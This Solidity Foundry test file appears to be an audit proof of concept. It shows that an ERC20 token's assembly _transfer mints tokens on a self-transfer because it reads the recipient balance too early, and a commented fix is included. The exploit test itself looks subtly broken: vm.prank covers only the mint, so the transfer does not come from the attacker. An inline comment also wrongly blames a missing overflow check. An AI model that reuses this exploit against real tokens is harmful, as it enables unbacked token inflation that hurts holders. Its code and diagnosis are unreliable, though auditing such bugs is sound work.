// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/src/Test.sol";
import "else/ERC20Token0x.sol";
/* function _transfer(address from, address to, uint256 value) internal returns (bool success) {
        assembly ("memory-safe") {
            if iszero(from) {
                mstore(0x00, shl(224, 0x96c6fd1e))
                mstore(add(0x00, 4), 0x00)
                revert(0x00, 0x24)
            }

            if iszero(to) {
                mstore(0x00, shl(224, 0xec442f05))
                mstore(add(0x00, 4), 0x00)
                revert(0x00, 0x24)
            }

            let ptr := mload(0x40)
            let baseSlot := _balances.slot

            mstore(ptr, from)
            mstore(add(ptr, 0x20), baseSlot)
            let fromSlot := keccak256(ptr, 0x40)
            let fromAmount := sload(fromSlot)
            mstore(ptr, to)
            mstore(add(ptr, 0x20), baseSlot)
            let toSlot := keccak256(ptr, 0x40)

            // the amount is got here, too early if its the same as fromAmount
            let toAmount := sload(toSlot)

            if lt(fromAmount, value) {
                mstore(0x00, shl(224, 0xe450d38c))
                mstore(add(0x00, 4), from)
                mstore(add(0x00, 0x24), fromAmount)
                mstore(add(0x00, 0x44), value)
                revert(0x00, 0x64)
            }

            // no check for it to see if the toAmount doesnt overflow because of toAmount += value
            // recomendation is to put:
            // if gt(value, not(0)-toAmount) { revert(0,0) }

            sstore(fromSlot, sub(fromAmount, value))
            sstore(toSlot, add(toAmount, value))
            success := 1
            mstore(ptr, value)
            log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
        }
    } */

contract AttackPOC is Test {

    ERC20Token0x public token;
    address public attacker;

    function setUp() public {
        token = new ERC20Token0x(type(uint256).max);
        attacker = address(1);
    }

    function test_InfiniteTokensCreation() public {
        vm.prank(attacker);
        token.mint(attacker, 100);
        assertEq(token.totalSupply(), 100);
        token.transfer(attacker, 100);
        
        // now balance will be 200
        assertEq(token._balanceOf(attacker), 200);

        // totalSupply has not changed although there are new tokens in circulation
        assertEq(token.totalSupply(), 100);
    }
}

// FIX:
/* add 
    ...
    sstore(fromSlot, sub(fromAmount, value))
    let toSlot := keccak256(ptr, 0x40)
    let toAmount := sload(toSlot)
    sstore(toSlot, add(toAmount, value))
    success := 1
    ...
*/